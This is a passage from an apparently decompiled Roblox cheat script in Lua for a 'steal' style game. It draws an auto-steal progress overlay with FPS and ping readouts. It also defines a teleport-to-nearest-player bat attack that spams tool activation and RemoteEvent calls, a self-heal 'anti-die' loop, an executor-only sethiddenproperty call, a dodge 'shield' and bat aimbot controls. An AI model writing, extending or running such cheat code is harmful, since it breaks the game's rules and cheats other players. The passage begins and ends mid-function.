		frame3.BackgroundColor3 = Color3.fromRGB(30, 20, 28)
		frame3.BorderSizePixel = 0
		frame3.ZIndex = 28
		Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
		local uiStroke2 = Instance.new("UIStroke", frame3)
		uiStroke2.Color = color4
		uiStroke2.Thickness = 1.2
		uiStroke2.Transparency = 0.35
		local imageLabel = Instance.new("ImageLabel", frame3)
		imageLabel.Size = UDim2.new(1, -2, 1, -2)
		imageLabel.Position = UDim2.new(0, 1, 0, 1)
		imageLabel.BackgroundTransparency = 1
		imageLabel.BorderSizePixel = 0
		imageLabel.ZIndex = 29
		imageLabel.ScaleType = Enum.ScaleType.Crop
		imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(localPlayer.UserId) .. "&w=150&h=150"
		Instance.new("UICorner", imageLabel).CornerRadius = UDim.new(1, 0)
		textLabel = Instance.new("TextLabel", stealBarFrame)
		textLabel.Size = UDim2.new(1, -6, 0, math.floor(18 * n21 + 0.5))
		textLabel.Position = UDim2.new(0, 3, 0, math.floor(8 * n21 + 0.5) + n24 + 2)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = "0%"
		textLabel.TextColor3 = color4
		textLabel.Font = Enum.Font.GothamBlack
		textLabel.TextSize = math.max(11, math.floor(13 * n21 + 0.5))
		textLabel.ZIndex = 26
		local textLabel2 = Instance.new("TextLabel", stealBarFrame)
		textLabel2.Size = UDim2.new(1, -6, 0, math.floor(12 * n21 + 0.5))
		textLabel2.Position = UDim2.new(0, 3, 0, math.floor(8 * n21 + 0.5) + n24 + math.floor(18 * n21 + 0.5))
		textLabel2.BackgroundTransparency = 1
		textLabel2.Text = "STEAL"
		textLabel2.TextColor3 = color4
		textLabel2.Font = Enum.Font.GothamBold
		textLabel2.TextSize = math.max(8, math.floor(9 * n21 + 0.5))
		textLabel2.ZIndex = 26
		local n25 = math.floor(8 * n21 + 0.5) + n24 + math.floor(32 * n21 + 0.5)
		local n26 = math.floor(34 * n21 + 0.5)
		local frame4 = Instance.new("Frame", stealBarFrame)
		frame4.Size = UDim2.new(0, math.floor(14 * n21 + 0.5), 1, -(n25 + n26))
		frame4.Position = UDim2.new(0.5, -math.floor(7 * n21 + 0.5), 0, n25)
		frame4.BackgroundColor3 = Color3.fromRGB(30, 18, 26)
		frame4.BorderSizePixel = 0
		frame4.ZIndex = 21
		frame4.ClipsDescendants = true
		Instance.new("UICorner", frame4).CornerRadius = UDim.new(1, 0)
		local uiStroke3 = Instance.new("UIStroke", frame4)
		uiStroke3.Color = color4
		uiStroke3.Thickness = 1
		uiStroke3.Transparency = 0.55
		frame = Instance.new("Frame", frame4)
		frame.AnchorPoint = Vector2.new(0, 1)
		frame.Size = UDim2.new(1, 0, 0, 0)
		frame.Position = UDim2.new(0, 0, 1, 0)
		frame.BackgroundColor3 = color4
		frame.BorderSizePixel = 0
		frame.ZIndex = 22
		Instance.new("UICorner", frame).CornerRadius = UDim.new(1, 0)
		uiGradient = Instance.new("UIGradient", frame)
		uiGradient.Rotation = 90
		local colorSequence = ColorSequence.new
		local tbl30 = {}
		local v4 = ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 200, 200))
		local new = ColorSequenceKeypoint.new
		local color6 = Color3.fromRGB
		local v5 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
		tbl30[1] = v4
		tbl30[2] = v5

		do
			local values = table.pack(new(1, color6(200, 200, 200)))
			table.move(values, 1, values.n, 3, tbl30)
		end

		uiGradient.Color = colorSequence(tbl30)
		local textLabel3 = Instance.new("TextLabel", stealBarFrame)
		textLabel3.Size = UDim2.new(1, -6, 0, math.floor(12 * n21 + 0.5))
		textLabel3.Position = UDim2.new(0, 3, 1, -math.floor(28 * n21 + 0.5))
		textLabel3.BackgroundTransparency = 1
		textLabel3.Text = "--"
		textLabel3.TextColor3 = color4
		textLabel3.Font = Enum.Font.GothamBold
		textLabel3.TextSize = math.max(8, math.floor(9 * n21 + 0.5))
		textLabel3.ZIndex = 26
		local textLabel4 = Instance.new("TextLabel", stealBarFrame)
		textLabel4.Size = UDim2.new(1, -6, 0, math.floor(12 * n21 + 0.5))
		textLabel4.Position = UDim2.new(0, 3, 1, -math.floor(14 * n21 + 0.5))
		textLabel4.BackgroundTransparency = 1
		textLabel4.Text = "--"
		textLabel4.TextColor3 = color4
		textLabel4.Font = Enum.Font.GothamBold
		textLabel4.TextSize = math.max(8, math.floor(9 * n21 + 0.5))
		textLabel4.ZIndex = 26
		local frame5 = Instance.new("Frame", screenGui)
		local floor = math.floor
		frame5.Size = UDim2.new(0, math.floor(140 * n21 + 0.5), 0, floor(18 * n21 + 0.5))
		frame5.Position = UDim2.new(0, 300, 0.5, -n23 / 2 - math.floor(24 * n21 + 0.5))
		frame5.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
		frame5.BackgroundTransparency = 0.15
		frame5.BorderSizePixel = 0
		frame5.Visible = false
		frame5.ZIndex = 25
		Instance.new("UICorner", frame5).CornerRadius = UDim.new(1, 0)
		local textLabel5 = Instance.new("TextLabel", frame5)
		textLabel5.Size = UDim2.new(1, 0, 1, 0)
		textLabel5.BackgroundTransparency = 1
		textLabel5.Text = ""
		textLabel5.TextColor3 = Color3.fromRGB(255, 120, 120)
		textLabel5.Font = Enum.Font.GothamBold
		textLabel5.TextSize = math.max(8, math.floor(9 * n21 + 0.5))
		textLabel5.ZIndex = 26

		task.spawn(function()
			local now2 = tick()
			local n27 = 0

			while textLabel3 and textLabel3.Parent do
				n27 += 1
				local now3 = tick()

				if now3 - now2 >= 0.5 then
					local n28 = math.floor(n27 / (now3 - now2) + 0.5)
					textLabel3.Text = tostring(n28) .. " fps"
					n27 = 0
					now2 = now3
				end

				task.wait()
			end
		end)

		task.spawn(function()
			while textLabel4 and textLabel4.Parent do
				pcall(function()
					local n27 = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() + 0.5)
					local color7

					if n27 < 80 then
						color7 = Color3.fromRGB(0, 255, 120)
					elseif n27 < 150 then
						color7 = Color3.fromRGB(255, 200, 0)
					else
						color7 = Color3.fromRGB(255, 60, 60)
					end

					textLabel4.Text = tostring(n27) .. " ms"
					textLabel4.TextColor3 = color7

					if n27 >= 150 then
						textLabel5.Text = "HIGH PING " .. tostring(n27)
						frame5.Visible = true

						if stealBarFrame then
							frame5.Position = UDim2.new(stealBarFrame.Position.X.Scale, stealBarFrame.Position.X.Offset, stealBarFrame.Position.Y.Scale, stealBarFrame.Position.Y.Offset - math.floor(22 * n21 + 0.5))
						end
					else
						frame5.Visible = false
					end
				end)

				task.wait(0.5)
			end
		end)

		stealBarFrame:SetAttribute("StealStyle", 1)

		PULSE.add(function(arg)
			if not (stealBarFrame and stealBarFrame.Parent) then
				return false
			end
			local color7 = fn3 and fn3() or Color3.fromRGB(0, 255, 120)
			local uiStroke4 = stealBarFrame:FindFirstChildOfClass("UIStroke")

			if uiStroke4 then
				uiStroke4.Color = color7
				uiStroke4.Transparency = 0.42 - 0.34 * arg
				uiStroke4.Thickness = 1.6 + 0.9 * arg
			end
		end)
	else
		local n21 = math.clamp(tonumber(n15) or 1, 0.7, 1.8)
		local n22 = math.floor(360 * n21 + 0.5)
		local n23 = math.floor(40 * n21 + 0.5)
		local n24 = math.floor(32 * n21 + 0.5)
		stealBarFrame = Instance.new("Frame", screenGui)
		stealBarFrame.Size = UDim2.new(0, n22, 0, n23)
		stealBarFrame.Position = UDim2.new(0.5, -n22 / 2, 0.88, 0)
		stealBarFrame.BackgroundColor3 = color3
		stealBarFrame.BorderSizePixel = 0
		stealBarFrame.ZIndex = 20
		stealBarFrame.ClipsDescendants = true
		stealBarFrame.Visible = true
		stealBarFrame.Active = true
		Instance.new("UICorner", stealBarFrame).CornerRadius = UDim.new(1, 0)
		local uiStroke = Instance.new("UIStroke", stealBarFrame)
		uiStroke.Color = fn3 and fn3() or color2
		uiStroke.Thickness = 1.6
		uiStroke.Transparency = 0.25
		local frame2 = Instance.new("Frame", stealBarFrame)
		frame2.Name = "Wash"
		frame2.Size = UDim2.new(1, 0, 1, 0)
		frame2.BackgroundColor3 = Color3.fromRGB(12, 14, 16)
		frame2.BackgroundTransparency = 0.35
		frame2.BorderSizePixel = 0
		frame2.ZIndex = 20
		frame2.ClipsDescendants = true
		Instance.new("UICorner", frame2).CornerRadius = UDim.new(1, 0)
		local uiGradient2 = Instance.new("UIGradient", frame2)
		local colorSequence = ColorSequence.new
		local tbl30 = {}
		local v4 = ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 20, 24))
		local v5 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 12, 14))
		tbl30[1] = v4
		tbl30[2] = v5

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 20, 24)))
			table.move(values, 1, values.n, 3, tbl30)
		end

		uiGradient2.Color = colorSequence(tbl30)
		uiGradient2.Rotation = 0
		local v6 = Random.new()

		for i = 1, 12 do
			local frame3 = Instance.new("Frame", frame2)
			local v7 = v6:NextInteger(2, 3)
			frame3.Size = UDim2.new(0, v7, 0, v7)
			frame3.Position = UDim2.new(v6:NextNumber(0.05, 0.95), 0, v6:NextNumber(0.2, 0.8), 0)
			frame3.BackgroundColor3 = Color3.fromRGB(220, 230, 240)
			frame3.BackgroundTransparency = v6:NextNumber(0.55, 0.85)
			frame3.BorderSizePixel = 0
			frame3.ZIndex = 21
			Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
		end

		local frame3 = Instance.new("Frame", stealBarFrame)
		frame3.Size = UDim2.new(0, n24, 0, n24)
		frame3.Position = UDim2.new(0, 4, 0.5, -n24 / 2)
		frame3.BackgroundColor3 = Color3.fromRGB(30, 20, 28)
		frame3.BorderSizePixel = 0
		frame3.ZIndex = 28
		Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
		local imageLabel = Instance.new("ImageLabel", frame3)
		imageLabel.Size = UDim2.new(1, -2, 1, -2)
		imageLabel.Position = UDim2.new(0, 1, 0, 1)
		imageLabel.BackgroundTransparency = 1
		imageLabel.BorderSizePixel = 0
		imageLabel.ZIndex = 29
		imageLabel.ScaleType = Enum.ScaleType.Crop
		imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(localPlayer.UserId) .. "&w=150&h=150"
		Instance.new("UICorner", imageLabel).CornerRadius = UDim.new(1, 0)
		frame = Instance.new("Frame", stealBarFrame)
		frame.Size = UDim2.new(0, 0, 1, 0)
		frame.BackgroundColor3 = fn3 and fn3() or color2
		frame.BorderSizePixel = 0
		frame.ZIndex = 21
		frame.ClipsDescendants = true
		Instance.new("UICorner", frame).CornerRadius = UDim.new(1, 0)
		uiGradient = Instance.new("UIGradient", frame)
		local colorSequence2 = ColorSequence.new
		local tbl31 = {}
		local v7 = ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 200, 200))
		local v8 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
		local new = ColorSequenceKeypoint.new
		local color4 = Color3.fromRGB
		tbl31[1] = v7
		tbl31[2] = v8

		do
			local values = table.pack(new(1, color4(200, 200, 200)))
			table.move(values, 1, values.n, 3, tbl31)
		end

		uiGradient.Color = colorSequence2(tbl31)
		local n25 = n24 + 12
		local frame4 = Instance.new("Frame", stealBarFrame)
		frame4.Size = UDim2.new(0, 110, 1, 0)
		frame4.Position = UDim2.new(0, n25, 0, 0)
		frame4.BackgroundTransparency = 1
		frame4.ZIndex = 25
		local textLabel2 = Instance.new("TextLabel", frame4)
		textLabel2.Size = UDim2.new(0, 55, 1, 0)
		textLabel2.Position = UDim2.new(0, 0, 0, 0)
		textLabel2.BackgroundTransparency = 1
		textLabel2.Text = "STEAL"
		textLabel2.TextColor3 = color2
		textLabel2.Font = Enum.Font.GothamBlack
		textLabel2.TextSize = 12
		textLabel2.TextXAlignment = Enum.TextXAlignment.Left
		textLabel2.ZIndex = 26
		stealBarFrame:SetAttribute("StealStyle", 2)

		PULSE.add(function(arg)
			if not (stealBarFrame and stealBarFrame.Parent) then
				return false
			end
			local color5 = fn3 and fn3() or Color3.fromRGB(0, 255, 120)
			local uiStroke2 = stealBarFrame:FindFirstChildOfClass("UIStroke")

			if uiStroke2 then
				uiStroke2.Color = color5
				uiStroke2.Transparency = 0.42 - 0.34 * arg
				uiStroke2.Thickness = 1.6 + 0.9 * arg
			end
		end)

		textLabel = Instance.new("TextLabel", frame4)
		textLabel.Size = UDim2.new(0, 50, 1, 0)
		textLabel.Position = UDim2.new(0, 55, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = "0%"
		textLabel.TextColor3 = color2
		textLabel.Font = Enum.Font.GothamBlack
		textLabel.TextSize = 12
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.ZIndex = 26
		local frame5 = Instance.new("Frame", stealBarFrame)
		frame5.Size = UDim2.new(0, 1, 0, n23 * 0.45)
		frame5.Position = UDim2.new(0, n25 + 110, 0.5, -(n23 * 0.45) / 2)
		frame5.BackgroundColor3 = color2
		frame5.BackgroundTransparency = 0.6
		frame5.BorderSizePixel = 0
		frame5.ZIndex = 25
		local textLabel3 = Instance.new("TextLabel", stealBarFrame)
		textLabel3.Size = UDim2.new(0, 68, 1, 0)
		textLabel3.Position = UDim2.new(0, n25 + 118, 0, 0)
		textLabel3.BackgroundTransparency = 1
		textLabel3.Text = "FPS: --"
		textLabel3.TextColor3 = color2
		textLabel3.Font = Enum.Font.GothamBold
		textLabel3.TextSize = 10
		textLabel3.TextXAlignment = Enum.TextXAlignment.Left
		textLabel3.ZIndex = 26

		task.spawn(function()
			local now2 = tick()
			local n26 = 0

			while textLabel3 and textLabel3.Parent do
				n26 += 1
				local now3 = tick()

				if now3 - now2 >= 0.5 then
					local n27 = math.floor(n26 / (now3 - now2) + 0.5)
					textLabel3.Text = "FPS: " .. tostring(n27)
					n26 = 0
					now2 = now3
				end

				task.wait()
			end
		end)

		local frame6 = Instance.new("Frame", stealBarFrame)
		frame6.Size = UDim2.new(0, 1, 0, n23 * 0.45)
		frame6.Position = UDim2.new(0, n25 + 190, 0.5, -(n23 * 0.45) / 2)
		frame6.BackgroundColor3 = color2
		frame6.BackgroundTransparency = 0.6
		frame6.BorderSizePixel = 0
		frame6.ZIndex = 25
		local textLabel4 = Instance.new("TextLabel", stealBarFrame)
		textLabel4.Size = UDim2.new(0, 90, 1, 0)
		textLabel4.Position = UDim2.new(0, n25 + 198, 0, 0)
		textLabel4.BackgroundTransparency = 1
		textLabel4.Text = "PING: --"
		textLabel4.TextColor3 = color2
		textLabel4.Font = Enum.Font.GothamBold
		textLabel4.TextSize = 10
		textLabel4.TextXAlignment = Enum.TextXAlignment.Left
		textLabel4.ZIndex = 26
		local frame7 = Instance.new("Frame", screenGui)
		frame7.Size = UDim2.new(0, 280, 0, 24)
		frame7.Position = UDim2.new(0.5, -140, 0.88, -30)
		frame7.BackgroundColor3 = Color3.fromRGB(50, 10, 10)
		frame7.BackgroundTransparency = 0.15
		frame7.BorderSizePixel = 0
		frame7.Visible = false
		frame7.ZIndex = 30
		Instance.new("UICorner", frame7).CornerRadius = UDim.new(1, 0)
		local textLabel5 = Instance.new("TextLabel", frame7)
		textLabel5.Size = UDim2.new(1, -8, 1, 0)
		textLabel5.Position = UDim2.new(0, 4, 0, 0)
		textLabel5.BackgroundTransparency = 1
		textLabel5.Text = ""
		textLabel5.TextColor3 = Color3.fromRGB(255, 120, 120)
		textLabel5.Font = Enum.Font.GothamBold
		textLabel5.TextSize = 11
		textLabel5.ZIndex = 31

		task.spawn(function()
			while textLabel4 and textLabel4.Parent do
				pcall(function()
					local n26 = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() + 0.5)
					local color5

					if n26 < 80 then
						color5 = Color3.fromRGB(0, 255, 120)
					elseif n26 < 150 then
						color5 = Color3.fromRGB(255, 200, 0)
					else
						color5 = Color3.fromRGB(255, 60, 60)
					end

					textLabel4.Text = "PING: " .. tostring(n26) .. "ms"
					textLabel4.TextColor3 = color5

					if n26 >= 150 then
						textLabel5.Text = "WARNING: HIGH PING  ·  " .. tostring(n26) .. "ms"
						frame7.Visible = true
						frame7.Active = true
					else
						frame7.Visible = false
						frame7.Active = false
					end
				end)

				task.wait(0.5)
			end
		end)
	end

	task.spawn(function()
		while frame and frame.Parent do
			local now2 = tick()

			if stealBarFrame then
				stealBarFrame.Visible = true
				stealBarFrame.Active = true
			end

			local flag40 = stealBarFrame and stealBarFrame:GetAttribute("StealStyle") == 1

			if tbl23.AutoStealEnabled then
				local n21 = tonumber(n18) or 0

				if flag40 then
					frame.Size = UDim2.new(1, 0, n21, 0)
				else
					frame.Size = UDim2.new(n21, 0, 1, 0)
				end

				if uiGradient then
					uiGradient.Offset = Vector2.new(math.sin(now2 * 3) * 0.5, 0)
				end

				if textLabel then
					textLabel.Text = math.floor(n21 * 100) .. "%"
				end
			else
				if flag40 then
					frame.Size = UDim2.new(1, 0, 0, 0)
				else
					frame.Size = UDim2.new(0, 0, 1, 0)
				end

				if textLabel then
					textLabel.Text = "0%"
				end
			end

			task.wait(0.016)
		end
	end)

	local position = nil
	local position2 = nil
	local flag40 = false

	stealBarFrame.InputBegan:Connect(function(input)
		if flag33 then
			return
		end

		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag40 = true
			position = input.Position
			position2 = stealBarFrame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					flag40 = false
				end
			end)
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if flag33 then
			flag40 = false
			return
		end

		if flag40 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local n21 = input.Position - position
			stealBarFrame.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n21.X, position2.Y.Scale, position2.Y.Offset + n21.Y)
		end
	end)
end

createStealBar()
local v4 = tbl28

tbl3.findBat = function()
	local character = localPlayer.Character
	if not character then
		return nil
	end

	for _, v5 in ipairs(v4) do
		local v6 = character:FindFirstChild(v5)
		if v6 and v6:IsA("Tool") then
			return v6
		end
	end

	local backpack = localPlayer:FindFirstChildOfClass("Backpack")

	if backpack then
		for _, v5 in ipairs(v4) do
			local v6 = backpack:FindFirstChild(v5)

			if v6 and v6:IsA("Tool") then
				local humanoid = character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					pcall(function()
						humanoid:EquipTool(v6)
					end)
				end

				return v6
			end
		end
	end

	for _, child in ipairs(character:GetChildren()) do
		if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
			return child
		end
	end

	return nil
end

tbl3.closestRoot = function()
	local character = localPlayer.Character
	character = character and character:FindFirstChild("HumanoidRootPart")
	if not character then
		return nil, math.huge
	end
	local huge = math.huge
	local v5 = nil

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= localPlayer and player.Character then
			local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
			local humanoid = player.Character:FindFirstChildOfClass("Humanoid")

			if humanoidRootPart and humanoid and humanoid.Health > 0 then
				local magnitude = (humanoidRootPart.Position - character.Position).Magnitude

				if magnitude < huge then
					huge = magnitude
					v5 = humanoidRootPart
				end
			end
		end
	end

	return v5, huge
end

tbl3.tpHit = function()
	if tbl3.hitCD then
		return
	end
	tbl3.hitCD = true

	pcall(function()
		local character = localPlayer.Character
		if not character then
			return
		end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		local v5 = tbl3.findBat()
		if not v5 then
			return
		end

		if v5.Parent ~= character and humanoid then
			pcall(function()
				humanoid:EquipTool(v5)
			end)
		end

		for i = 1, 3 do
			pcall(function()
				v5:Activate()
			end)

			local remoteEvent = v5:FindFirstChildWhichIsA("RemoteEvent")

			if remoteEvent then
				pcall(function()
					remoteEvent:FireServer()
				end)
			end

			for _, descendant in ipairs(v5:GetDescendants()) do
				if descendant:IsA("RemoteEvent") then
					pcall(function()
						descendant:FireServer()
					end)
				end
			end
		end

		task.defer(function()
			if v5 and v5.Parent then
				pcall(function()
					v5:Activate()
				end)

				local remoteEvent = v5:FindFirstChildWhichIsA("RemoteEvent")

				if remoteEvent then
					pcall(function()
						remoteEvent:FireServer()
					end)
				end
			end
		end)
	end)

	task.delay(0.03, function()
		tbl3.hitCD = false
	end)
end

Macho_forceAimbotOff = function()
	flag13 = false

	if aimbotConn then
		pcall(function()
			aimbotConn:Disconnect()
		end)

		aimbotConn = nil
	end

	if stopBatAimbot then
		pcall(stopBatAimbot)
	end

	flag13 = false

	pcall(function()
		if autoBatSetVisual then
			autoBatSetVisual(false)
		end

		if tbl6 and tbl6.autoBat then
			tbl6.autoBat(false)
		end

		if GuiToggleSetters and GuiToggleSetters.circle then
			GuiToggleSetters.circle(false)
		end
	end)
end

tbl3.startTPBat = function()
	Macho_forceAimbotOff()

	if tbl3.tpConn then
		pcall(function()
			tbl3.tpConn:Disconnect()
		end)

		tbl3.tpConn = nil
	end

	if tbl3._tpShieldConn then
		pcall(function()
			tbl3._tpShieldConn:Disconnect()
		end)

		tbl3._tpShieldConn = nil
	end

	if tbl3._tpAntiDieConn then
		pcall(function()
			tbl3._tpAntiDieConn:Disconnect()
		end)

		tbl3._tpAntiDieConn = nil
	end

	if tbl3._tpCharConn then
		pcall(function()
			tbl3._tpCharConn:Disconnect()
		end)

		tbl3._tpCharConn = nil
	end

	if tbl3._tpPatchConn then
		pcall(function()
			tbl3._tpPatchConn:Disconnect()
		end)

		tbl3._tpPatchConn = nil
	end

	tbl3.tpBat = true
	tbl3._tpHitDone = false
	tbl3._tpTargetHealth = nil
	tbl3._tpTargetHum = nil

	local function fn23()
		if tbl3._tpHitDone then
			return
		end
		tbl3._tpHitDone = true
		tbl3.stopTPBat()

		pcall(function()
			if tbl3.setTPBatVisual then
				tbl3.setTPBatVisual(false)
			end

			if tbl6 and tbl6.tpBat then
				tbl6.tpBat(false)
			end
		end)
	end

	local function fn24(arg)
		if tbl3._tpAntiDieConn then
			pcall(function()
				tbl3._tpAntiDieConn:Disconnect()
			end)
		end

		if not arg then
			return
		end
		local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 3)
		if not humanoid then
			return
		end

		tbl3._tpAntiDieConn = humanoid.HealthChanged:Connect(function(health)
			if not tbl3.tpBat then
				return
			end

			if health <= 0 then
				pcall(function()
					humanoid.Health = humanoid.MaxHealth
				end)
			end
		end)
	end

	fn24(localPlayer.Character)

	tbl3._tpCharConn = localPlayer.CharacterAdded:Connect(function(character)
		if not tbl3.tpBat then
			return
		end
		task.wait(0.1)
		fn24(character)
	end)

	tbl3.tpConn = RunService.Heartbeat:Connect(function()
		if not tbl3.tpBat then
			return
		end
		local character = localPlayer.Character
		if not character then
			return
		end
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart then
			return
		end
		local humanoid = character:FindFirstChildOfClass("Humanoid")

		if humanoid and humanoid.Health <= 0 then
			pcall(function()
				humanoid.Health = humanoid.MaxHealth
			end)
		end

		local tpLockedRoot = tbl3._tpLockedRoot

		if not tpLockedRoot or not tpLockedRoot.Parent or not tpLockedRoot.Parent.Parent then
			tpLockedRoot = tbl3.closestRoot()
			tbl3._tpLockedRoot = tpLockedRoot
		else
			local humanoid2 = tpLockedRoot.Parent and tpLockedRoot.Parent:FindFirstChildOfClass("Humanoid")

			if not humanoid2 or humanoid2.Health <= 0 then
				tpLockedRoot = tbl3.closestRoot()
				tbl3._tpLockedRoot = tpLockedRoot
			end
		end

		if tpLockedRoot then
			if sethiddenproperty then
				pcall(function()
					sethiddenproperty(humanoidRootPart, "PhysicsRepRootPart", tpLockedRoot)
				end)
			end

			local assemblyLinearVelocity = tpLockedRoot.AssemblyLinearVelocity or Vector3.zero
			local n20 = tpLockedRoot.Position + assemblyLinearVelocity * 0.05 + Vector3.new(0, 0.35, 0) + Vector3.new(0, 0.2, 0)
			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)

			if vector.Magnitude < 0.15 then
				vector = Vector3.new(tpLockedRoot.Position.X - humanoidRootPart.Position.X, 0, tpLockedRoot.Position.Z - humanoidRootPart.Position.Z)
			end

			if vector.Magnitude > 0.05 then
				humanoidRootPart.CFrame = CFrame.lookAt(n20, n20 + vector.Unit)
			else
				humanoidRootPart.CFrame = CFrame.new(n20)
			end

			if (humanoidRootPart.Position - tpLockedRoot.Position).Magnitude > 3.5 then
				humanoidRootPart.CFrame = CFrame.lookAt(tpLockedRoot.Position + Vector3.new(0, 0.4, 0), tpLockedRoot.Position)
			end

			humanoidRootPart.AssemblyLinearVelocity = assemblyLinearVelocity
			humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
			local currentCamera = workspace.CurrentCamera

			if currentCamera then
				currentCamera.CFrame = CFrame.lookAt(currentCamera.CFrame.Position, tpLockedRoot.Position + Vector3.new(0, 1, 0))
			end

			tbl3.tpHit()

			if (humanoidRootPart.Position - tpLockedRoot.Position).Magnitude < 4 then
				tbl3.tpHit()
			end

			local humanoid2 = tpLockedRoot.Parent and tpLockedRoot.Parent:FindFirstChildOfClass("Humanoid")

			if humanoid2 then
				if tbl3._tpTargetHum == humanoid2 and tbl3._tpTargetHealth then
					if humanoid2.PlatformStand or humanoid2.Health < tbl3._tpTargetHealth - 0.5 then
						fn23()
						return
					end
				end

				tbl3._tpTargetHum = humanoid2
				tbl3._tpTargetHealth = humanoid2.Health
			end
		end
	end)

	tbl3._tpShieldConn = RunService.Heartbeat:Connect(function()
		if not tbl3.tpBat then
			return
		end
		local character = localPlayer.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		character = character and character:FindFirstChildOfClass("Humanoid")
		if not humanoidRootPart or not character or character.Health <= 0 then
			return
		end
		local v5 = tbl3.closestRoot()

		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer and player.Character then
				local humanoidRootPart2 = player.Character:FindFirstChild("HumanoidRootPart")
				local tool = player.Character:FindFirstChildWhichIsA("Tool")

				if humanoidRootPart2 and tool then
					local str3 = tool.Name:lower()

					if str3:find("bat") or str3:find("slap") then
						if (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude < 8 and humanoidRootPart2 ~= v5 then
							local v6 = math.rad(tick() * 500)
							humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(math.sin(v6) * 3, 0, math.cos(v6) * 3)
						end
					end
				end
			end
		end
	end)
end

tbl3.stopTPBat = function()
	tbl3.tpBat = false
	tbl3._tpHitDone = false
	tbl3._tpTargetHealth = nil
	tbl3._tpTargetHum = nil
	tbl3._tpLockedRoot = nil

	if tbl3.tpConn then
		pcall(function()
			tbl3.tpConn:Disconnect()
		end)

		tbl3.tpConn = nil
	end

	if tbl3._tpShieldConn then
		pcall(function()
			tbl3._tpShieldConn:Disconnect()
		end)

		tbl3._tpShieldConn = nil
	end

	if tbl3._tpAntiDieConn then
		pcall(function()
			tbl3._tpAntiDieConn:Disconnect()
		end)

		tbl3._tpAntiDieConn = nil
	end

	if tbl3._tpCharConn then
		pcall(function()
			tbl3._tpCharConn:Disconnect()
		end)

		tbl3._tpCharConn = nil
	end

	if tbl3._tpPatchConn then
		pcall(function()
			tbl3._tpPatchConn:Disconnect()
		end)

		tbl3._tpPatchConn = nil
	end

	pcall(function()
		local currentCamera = workspace.CurrentCamera

		if currentCamera and currentCamera.CameraType == Enum.CameraType.Scriptable then
			currentCamera.CameraType = Enum.CameraType.Custom
		end
	end)
end

tbl3.v2Swing = function()
	local now2 = tick()
	if now2 - (n8 or 0) < 0.05 then
		return
	end
	n8 = now2
	tbl3.v2CD = true

	pcall(function()
		local character = localPlayer.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local v5 = tbl3.findBat()
		if not v5 then
			return
		end

		if v5.Parent ~= character and humanoid then
			pcall(function()
				humanoid:EquipTool(v5)
			end)
		end

		pcall(function()
			v5:Activate()
		end)

		local remoteEvent = v5:FindFirstChildWhichIsA("RemoteEvent")

		if remoteEvent then
			pcall(function()
				remoteEvent:FireServer()
			end)
		end

		task.defer(function()
			if v5 and v5.Parent then
				pcall(function()
					v5:Activate()
				end)
			end
		end)
	end)

	task.delay(0.05, function()
		tbl3.v2CD = false
	end)
end

tbl3.stopBatV2 = function()
	flag14 = false
	tbl3.batV2 = false

	if connection then
		pcall(function()
			connection:Disconnect()
		end)

		connection = nil
	end

	if tbl3.v2Conn then
		pcall(function()
			tbl3.v2Conn:Disconnect()
		end)

		tbl3.v2Conn = nil
	end

	local character = localPlayer.Character

	if character then
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		local humanoid = character:FindFirstChildOfClass("Humanoid")

		if humanoidRootPart then
			humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
			humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
		end

		if humanoid then
			humanoid.AutoRotate = true
		end
	end

	pcall(function()
		if tbl6 and tbl6.batV2 then
			tbl6.batV2(false)
		end
	end)
end

tbl3.startBatV2 = function()
	if connection then
		pcall(function()
			connection:Disconnect()
		end)

		connection = nil
	end

	pcall(function()
		if tbl3.tpBat and tbl3.stopTPBat then
			tbl3.stopTPBat()
		end

		if flag13 and stopBatAimbot then
			stopBatAimbot()
		end

		if flag11 then
			flag11 = false

			if stopAutoLeft then
				stopAutoLeft()
			end
		end

		if flag12 then
			flag12 = false

			if stopAutoRight then
				stopAutoRight()
			end
		end
	end)

	flag14 = true
	tbl3.batV2 = true
	local n20 = 28
	local n21 = -1

	connection = RunService.Heartbeat:Connect(function()
		if not flag14 or not tbl3.batV2 then
